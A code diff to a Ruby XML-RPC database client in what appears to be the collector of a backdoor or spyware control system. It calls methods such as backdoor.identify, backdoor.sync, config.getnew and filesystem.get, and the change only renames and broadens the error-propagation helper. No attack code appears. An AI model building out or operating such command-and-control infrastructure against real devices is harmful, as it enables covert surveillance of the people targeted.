@@ -15,6 +15,7 @@ module Collector
 class DB_xmlrpc
   include RCS::Tracer
 
+  # if a method does not reply in X seconds consider db down
   DB_TIMEOUT = 5
 
   def initialize(host)
@@ -52,11 +53,13 @@ class DB_xmlrpc
   end
 
   # timeout exception propagator
-  def propagate_timeout(e)
+  def propagate_error(e)
     # the db is down we have to report it to the upper layer
-    if e.class.eql? Timeout::Error then
-        trace :warn, "The DB in not responding within #{DB_TIMEOUT} seconds..."
-        raise
+    # if the exception is not from xmlrpc (does not have faultCode)
+    # it means that we are not able to talk to the db
+    if not e.respond_to?(:faultCode) then
+      trace :warn, "The DB in not responding: #{e.class} #{e.message}"
+      raise
     end
   end
 
@@ -78,7 +81,7 @@ class DB_xmlrpc
       end
 
       trace :error, "Error calling auth.login: #{e.class} #{e.message}"
-
+      
       return false
     end
   end
@@ -86,7 +89,6 @@ class DB_xmlrpc
   def logout
     begin
       response = xmlrpc_call('auth.logout')
-      trace :debug, "XML-RPC logout: #{response}"
       return true
     rescue Exception => e
       trace :error, "Error calling auth.logout: #{e.class} #{e.message}"
@@ -99,7 +101,7 @@ class DB_xmlrpc
       xmlrpc_call('monitor.set', component, remoteip, status, message, disk, cpu, pcpu)
     rescue Exception => e
       trace :error, "Error calling monitor.set: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -109,7 +111,7 @@ class DB_xmlrpc
       return xmlrpc_call('sign.get', "backdoor")
     rescue Exception => e
       trace :error, "Error calling sign.get: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -129,7 +131,7 @@ class DB_xmlrpc
       return class_keys
     rescue Exception => e
       trace :error, "Error calling backdoor.getclasskey: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -156,7 +158,7 @@ class DB_xmlrpc
       end
 
       trace :error, "Error calling backdoor.identify: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
 
       return DB::UNKNOWN_BACKDOOR, 0
     end
@@ -168,7 +170,7 @@ class DB_xmlrpc
       xmlrpc_call('backdoor.sync', bid, source, user, device, version, time)
     rescue Exception => e
       trace :error, "Error calling backdoor.sync: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -218,7 +220,7 @@ class DB_xmlrpc
       return cid, config
     rescue Exception => e
       trace :error, "Error calling config.getnew: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -227,7 +229,7 @@ class DB_xmlrpc
       xmlrpc_call('config.setsent', cid)
     rescue Exception => e
       trace :error, "Error calling config.setsent: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -245,7 +247,7 @@ class DB_xmlrpc
       return upl
     rescue Exception => e
       trace :error, "Error calling download.get: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -254,7 +256,7 @@ class DB_xmlrpc
       xmlrpc_call('upload.del', id)
     rescue Exception => e
       trace :error, "Error calling upload.del: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -272,7 +274,7 @@ class DB_xmlrpc
       return down
     rescue Exception => e
       trace :error, "Error calling download.get: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -281,7 +283,7 @@ class DB_xmlrpc
       xmlrpc_call('download.del', id)
     rescue Exception => e
       trace :error, "Error calling download.del: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -299,7 +301,7 @@ class DB_xmlrpc
       return files
     rescue Exception => e
       trace :error, "Error calling filesystem.get: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
@@ -308,7 +310,7 @@ class DB_xmlrpc
       xmlrpc_call('filesystem.del', id)
     rescue Exception => e
       trace :error, "Error calling filesystem.del: #{e.class} #{e.message}"
-      propagate_timeout e
+      propagate_error e
     end
   end
 
